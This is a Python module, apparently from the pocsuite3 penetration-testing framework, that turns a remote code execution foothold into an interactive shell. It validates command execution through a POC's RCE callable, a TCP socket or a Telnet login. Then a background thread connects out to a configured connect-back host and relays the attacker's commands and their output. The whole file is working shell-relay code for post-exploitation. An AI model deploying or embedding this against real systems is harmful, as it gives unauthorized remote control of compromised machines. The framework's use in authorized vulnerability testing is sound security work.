import os
import socket
import select
import telnetlib
import threading
from pocsuite3.lib.core.poc import POCBase
from pocsuite3.lib.utils import random_str
from pocsuite3.lib.core.common import check_port
from pocsuite3.lib.core.data import conf, logger


def read_inputs(s):
    buffer = []
    try:
        while True:
            chunk = s.recv(1)
            if not chunk or chunk == b'\n':
                break
            buffer.append(chunk)
    except Exception:
        pass
    return b''.join(buffer)


def read_results(conn, inputs):
    if isinstance(conn, telnetlib.Telnet):
        flag = random_str(6).encode()
        inputs = inputs.strip() + b';' + flag + b'\n'
        results = b''
        conn.write(inputs)
        count = 10
        while count:
            count -= 1
            chunk = conn.read_until(random_str(6).encode(), 0.2)
            if len(chunk) > 0:
                results += chunk
            if results.count(flag) >= 2:
                # remove the Telnet input echo
                results = results.split(inputs.strip())[-1]
                results = os.linesep.encode().join(
                    results.split(flag)[0].splitlines()[0:-1])
                return results.strip() + b'\n'
    elif callable(conn):
        results = conn(inputs.decode())
        if not isinstance(results, bytes):
            results = results.encode()
        if results.strip() == b'':
            results = b'COMMAND NO OUTPUT\n'
        return results
    elif isinstance(conn, socket.socket):
        flag = random_str(6).encode()
        inputs = inputs.strip() + b';' + flag + b'\n'
        conn.send(inputs)
        count = 10
        results = b''
        while count:
            count -= 1
            ready = select.select([conn], [], [], 0.2)
            if ready[0]:
                chunk = conn.recv(1024)
                results += chunk
            if results.count(flag) >= 2:
                break
        results = results.split(inputs.strip())[-1]
        results = os.linesep.encode().join(
            results.split(flag)[0].splitlines()[0:-1])
        return results.strip() + b'\n'
    return b'\n'


def flow_redirect(conn):
    s = socket.socket()
    s.connect((conf.connect_back_host, conf.connect_back_port))
    while True:
        inputs = read_inputs(s)
        results = read_results(conn, inputs)
        s.send(results)


def start_listener(conn):
    t = threading.Thread(target=flow_redirect,
                         name="bind-listener-thread",
                         args=[conn])
    t.setDaemon(True)
    t.start()


def bind_shell(obj, rce_func='_rce', check=True):
    if not (isinstance(obj, POCBase) and hasattr(obj, rce_func)
            and callable(getattr(obj, rce_func))):
        return False
    conn = getattr(obj, rce_func)
    if check:
        flag = random_str(6).encode()
        if flag not in read_results(conn, b'echo %s' % flag):
            return False
    start_listener(conn)


def bind_tcp_shell(host, port, check=True):
    if not check_port(host, port):
        return False
    try:
        s = socket.socket()
        s.connect((host, port))
        if check:
            flag = random_str(6).encode()
            if flag not in read_results(s, b'echo %s' % flag):
                return False
        start_listener(s)
    except Exception as e:
        logger.error(str(e))


def bind_telnet_shell(host, port, user, pwd, check=True):
    if not check_port(host, port):
        return False
    try:
        tn = telnetlib.Telnet(host, port)
        tn.expect([b'Login: ', b'login: '], 10)
        tn.write(user.encode() + b'\n')
        tn.expect([b'Password: ', b'password: '], 10)
        tn.write(pwd.encode() + b'\n')
        tn.write(b'\n')
        if check:
            flag = random_str(6).encode()
            if flag not in read_results(tn, b'echo %s' % flag):
                return False
        start_listener(tn)
    except Exception as e:
        logger.error(str(e))
